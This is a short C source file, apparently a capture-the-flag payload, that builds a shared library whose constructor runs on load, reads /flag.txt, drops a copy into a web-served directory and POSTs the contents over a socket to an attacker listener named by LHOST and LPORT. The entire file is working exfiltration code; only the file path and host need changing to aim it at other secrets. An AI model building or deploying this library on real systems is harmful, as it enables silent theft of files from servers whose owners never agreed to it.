#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Build with:
 *   gcc -shared -fPIC -O2 -DLHOST='"127.0.0.1"' -DLPORT=4466 -o payload.so pwn.c
 * LHOST/LPORT point at the attacker listener that receives the exfiltrated flag.
 */
#ifndef LHOST
#define LHOST "127.0.0.1"
#endif
#ifndef LPORT
#define LPORT 4466
#endif
#ifndef FLAG_PATH
#define FLAG_PATH "/flag.txt"
#endif
#ifndef STAGING_DIR
#define STAGING_DIR "/app/static/dl"
#endif

__attribute__((constructor)) static void run(void) {
  char flag[2048];
  ssize_t n = 0;
  int fd = open(FLAG_PATH, O_RDONLY);
  if (fd >= 0) { n = read(fd, flag, sizeof(flag) - 1); close(fd); }
  if (n <= 0) return;
  flag[n] = 0;

  /* Secondary channel: drop a copy into the directory served by express. */
  int out = open(STAGING_DIR "/flag.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (out >= 0) { write(out, flag, n); close(out); }

  /* Primary channel: one-shot HTTP POST to the attacker listener. */
  int s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) return;
  struct sockaddr_in a;
  memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET;
  a.sin_port = htons(LPORT);
  a.sin_addr.s_addr = inet_addr(LHOST);
  if (connect(s, (struct sockaddr *)&a, sizeof(a)) == 0) {
    char req[4096];
    int rl = snprintf(req, sizeof(req),
      "POST /flag HTTP/1.1\r\nHost: " LHOST "\r\nContent-Length: %ld\r\nConnection: close\r\n\r\n",
      (long)n);
    if (write(s, req, rl) > 0) write(s, flag, n);
    close(s);
  }
}
